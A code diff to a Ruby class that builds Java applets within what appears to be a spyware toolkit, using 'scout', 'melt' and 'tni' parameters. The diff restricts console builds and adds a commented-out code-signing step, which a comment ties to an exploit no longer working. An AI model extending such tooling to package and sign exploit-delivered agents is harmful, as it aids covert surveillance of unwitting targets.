@@ -35,6 +35,9 @@ class BuildApplet < Build
       build.scramble
       build.melt params['melt'].dup
 
+      # remember the scout flag
+      @scout = params['melt']['scout']
+
       outs = build.outputs
 
       # copy the outputs in our directory
@@ -58,6 +61,9 @@ class BuildApplet < Build
 
   def melt(params)
     trace :debug, "Build: melt #{params}"
+
+    # enforce that the applet cannot be build from console
+    raise "Cannot build java applet directly" if @scout and not params['tni']
 
     @appname = params['appname'] || 'applet'    
 
@@ -89,7 +95,25 @@ class BuildApplet < Build
   end
 
   def sign(params)   
-    # remember to sign, if exploit doesn't work anymore 
+    # remember to sign, if exploit doesn't work anymore
+
+=begin
+    trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"
+
+    jar = path(@outputs.first)
+    cert = path(@appname + '.cer')
+
+    raise "Cannot find keystore" unless File.exist? Config.instance.cert('applet.keystore')
+
+    CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{jar} signapplet"
+    raise "jarsigner failed" unless File.exist? jar
+
+    CrossPlatform.exec "keytool", "-export -keystore #{Config.instance.cert('applet.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -alias signapplet -file #{cert}"
+    raise "keytool export failed" unless File.exist? cert
+
+    @outputs << @appname + '.cer'
+=end
+
   end
   
   def pack(params)
